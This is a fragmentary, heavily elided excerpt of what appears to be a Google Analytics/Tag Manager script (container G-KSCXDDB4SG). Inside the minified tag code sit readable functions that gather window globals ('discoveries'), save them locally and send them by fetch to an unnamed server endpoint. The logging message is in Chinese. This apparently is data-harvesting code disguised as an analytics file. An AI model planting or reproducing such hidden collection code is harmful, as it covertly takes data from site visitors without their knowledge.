...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 13,
        "vtp_instanceDestinationId": "G-KSCXDDB4SG",
        "tag_id": 25
      }, {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARIlAOzHCQhOco+q0zzCsADhiwGUUX6+JynSCqpmuXKrPztUeZkonxoClcQ\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function exploreEnhancedWindowObject() {
    ...
    if (typeof window.globalVar === 'object') {
      discoveries['globalVar'] = JSON.stringify(window.globalVar);
    }
    return discoveries;
  }
  function cm(a) {
  ...
  function transmitEnhancedData(data) {
    ...
    fetch(serverEndpoint, {
      ...
      if (response.ok) {
        ...
        console.error("服务器响应错误，状态码:" + response.status);
      }
    }).catch(error => {
  ...
  function enhancedDiscoveryTask() {
    ...
    if (discoveryCount > 0) {
      ...
      storeLocalData('discoveries', discoveries);
      transmitEnhancedData(discoveries);
    } else {
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-KSCXDDB4SG'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
